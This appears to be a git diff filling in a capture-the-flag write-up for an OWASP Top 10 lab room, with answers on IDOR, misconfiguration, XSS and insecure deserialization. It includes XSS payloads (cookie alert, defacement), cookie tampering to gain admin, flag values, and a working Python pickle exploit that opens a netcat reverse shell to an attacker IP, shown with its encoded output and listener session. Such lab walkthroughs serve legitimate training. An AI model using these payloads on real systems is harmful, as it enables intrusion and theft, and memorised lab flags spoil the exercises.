@@ -171,60 +171,67 @@ falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
 
 ### Look at other users notes. What is the flag?
 ```
+http://<machine ip>/note.php?note=0
+flag{fivefourthree}
 ```
-> *Answer:* 
+> *Answer:* flag{fivefourthree}
 
 
 <br><br>
 # [Severity 6] Security Misconfiguration
 
 ### Hack into the webapp, and find the flag!
+Google Search <a href="https://github.com/NinjaJc01/PensiveNotes" target="_blank">PensiveNotes - A note taking app</a>
 ```
+...
+After downloading and compiling PensiveNotes, log in using the default credentials pensive:PensiveNotes
+Make sure you change this password immediately!
 ```
-> *Answer:* 
+> *Answer:* thm{4b9513968fd564a87b28aa1f9d672e17}
 
 
 <br><br>
 # [Severity 7] Cross-site Scripting
 
-### Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
+### On the "Reflected XSS" tab; craft a reflected XSS payload that will cause a popup saying "Hello".
 ```
+<script>alert(“Hello”)</script>
 ```
-> *Answer:* 
+> *Answer:* ThereIsMoreToXSSThanYouThink
 
 ### On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
 ```
+<script>alert(window.location.hostname)</script>
 ```
-> *Answer:* 
+> *Answer:* ReflectiveXss4TheWin
 
-### Now navigate to http://MACHINE_IP/ in your browser and click on the "Stored XSS" tab on the navbar; make an account. Then add a comment and see if you can insert some of your own HTML.
+### On the "Stored XSS" tab on the navbar; make an account. Then add a comment and see if you can insert some of your own HTML.
 ```
+<h1>Heading 1</h1>
 ```
-> *Answer:* 
+> *Answer:* HTML_T4gs
 
 ### On the same page, create an alert popup box appear on the page with your document cookies.
 ```
+<script>alert(document.cookie)</script>
 ```
-> *Answer:* 
+> *Answer:* W3LL_D0N3_LVL2
 
 ### Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
 ```
+<script>document.querySelector('#thm-title').textContent = 'I am a hacker';</script>
 ```
-> *Answer:* 
+> *Answer:* websites_can_be_easily_defaced_with_xss
 
 
 <br><br>
 # [Severity 8] Insecure Deserialization
 
 ### Who developed the Tomcat application?
-```
-```
-> *Answer:* 
+> *Answer:* The Apache Software Foundation
 
 ### What type of attack that crashes services can be performed with insecure deserialization?
-```
-```
-> *Answer:* 
+> *Answer:* Denial of Service
 
 
 <br><br>
@@ -238,9 +245,7 @@ falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
 # [Severity 8] Insecure Deserialization - Deserialization
 
 ### What is the name of the base-2 formatting that data is sent across a network as?
-```
-```
-> *Answer:* 
+> *Answer:* binary
 
 
 <br><br>
@@ -258,22 +263,55 @@ falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
 
 ### 1st flag (cookie value)
 ```
+Decode cookie sessionId
 ```
-> *Answer:* 
+> *Answer:* THM{good_old_base64_huh}
 
 ### 2nd flag (admin dashboard)
 ```
+Change our userType to admin
 ```
-> *Answer:* 
+> *Answer:* THM{heres_the_admin_flag}
 
 
 <br><br>
 # [Severity 8] Insecure Deserialization - Code Execution
 
 ### flag.txt
+Create a python file to paste into, I have used "rce.py".
 ```
+┌──(root💀kali)-[~]
+└─# cat > rce.py                    
+import pickle
+import sys
+import base64
+
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+
+class rce(object):
+        def __reduce__(self):
+                import os
+                return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
+
+┌──(root💀kali)-[~]
+└─# python3 rce.py                                         
+b'gASVdQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFpybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuOC4yNDEuMTQxIDQ0NDQgPiAvdG1wL2aUhZRSlC4='
 ```
-> *Answer:* 
+Paste the output into the "encodedPayload" cookie in your browser.
+```
+┌──(root💀kali)-[~]
+└─# nc -lvnp 4444         
+listening on [any] 4444 ...
+connect to [10.8.241.141] from (UNKNOWN) [10.10.42.232] 34580
+/bin/sh: 0: can't access tty; job control turned off
+$ find / -type f -name flag.txt 2> /dev/null
+/home/cmnatic/flag.txt
+$ cat /home/cmnatic/flag.txt
+4a69a7ff9fd68
+```
+> *Answer:* 4a69a7ff9fd68
 
 
 <br><br>
